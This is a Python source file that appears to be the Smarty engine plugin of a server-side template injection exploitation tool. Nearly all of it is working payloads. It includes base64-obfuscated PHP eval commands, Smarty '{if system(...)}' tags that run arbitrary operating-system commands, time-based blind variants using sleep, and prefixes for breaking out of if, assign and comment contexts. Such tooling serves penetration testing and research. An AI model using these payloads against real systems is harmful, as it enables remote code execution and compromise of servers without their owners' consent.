from plugins.languages import php
from utils import rand
from plugins.languages import bash


class Smarty(php.Php):
    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': '{{{header}}}',
                'trailer': '{{{trailer}}}',
                'test_render': f"""{{{rand.randints[0]}}}{{*{rand.randints[1]}*}}{{{rand.randints[2]}}}""",
                'test_render_expected': f'{rand.randints[0]}{rand.randints[2]}'
            },
            'evaluate': {
                # Dirty hack from Twig
                'call': 'execute',
                'evaluate': """php -r '$d="{code_b64}";eval(base64_decode(str_pad(strtr($d,"-_","+/"),strlen($d)%4,"=",STR_PAD_RIGHT)));'""",
                'test_os': 'echo PHP_OS;',
                'test_os_expected': r'^[\w-]+$'
            },
            'evaluate_blind': {
                # Dirty hack from Twig
                'call': 'execute',
                'evaluate_blind': """php -r '$d="{code_b64}";eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ") && sleep({delay});");'"""
            },
            'execute': {
                'call': 'render',
                'execute': """{{if system(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)))}}{{/if}}""",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2]
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """{{if system(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT))|cat:" && sleep {delay}")}}{{/if}}"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            {'level': 1, 'prefix': '{closure}}}', 'suffix': '{', 'closures': php.ctx_closures},
            # {config_load file="missing_file"} raises an exception
            # Escape Ifs
            {'level': 5, 'prefix': '{closure}}}{{/if}}{{if 1}}', 'suffix': '', 'closures': php.ctx_closures},
            # Escape {assign var="%s" value="%s"}
            {'level': 5, 'prefix': '{closure} var="" value=""}}{{assign var="" value=""}}', 'suffix': '', 'closures': php.ctx_closures},
            # Comments
            {'level': 5, 'prefix': '*}}', 'suffix': '{*'},
        ])
